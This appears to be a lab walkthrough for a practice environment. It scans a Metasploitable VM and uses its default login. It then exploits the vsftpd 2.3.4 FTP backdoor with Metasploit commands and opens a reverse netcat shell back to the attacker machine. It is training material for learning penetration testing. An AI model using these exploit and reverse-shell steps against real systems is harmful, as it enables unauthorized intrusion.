Task 1
For this task we will be using metasploitable and metasploit.

1) Launch Metasploitable environment. Login information: name: msfadmin; password: msfadmin.

2)Check IP address of Metasploitable. Using command: ifconfig
Here we need to ensure that settings of virtual box is correct. The network must be nat network.
Note down the IP address, for example 10.0.2.15 . We will use that later.

3)Open Kali, open Zenmap. We’ll use this to find vulnerabilities. The other option is to do it manually.
Enter the IP address we got from the last step in the target blank. Then click scan.

4)When scan is finished, we can a list of vulnerabilities of the system, but we will mainly talk about the ftp backdoor.
The version is vsftpd_234_backdoor

5)Then let’s exploit! Ref: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
Open metasploit in Kali.
Enter the following commands:
use exploit/unix/ftp/vsftpd_234_backdoor
// the following commands will be in msfconsole:.
show targets
show options
set RHOST (IP address of Metasploitable)
exploit
ifconfig (If the ip address is the same with that of Metasploitable, we’re in that network, yeah!!)


Task 2
This task is to create an interactive shell via netcat, which means that we can listen to other computers.

1)We need to use the IP address of metasploit environment this time.
2)Ref: https://www.rapid7.com/db/modules/payload/cmd/unix/reverse_netcat
Use following commands.
show payloads
use payload/cmd/unix/reverse_netcat
show options(LHOST IP is empty)
set LHOST (IP address of Metasploit)
exploit
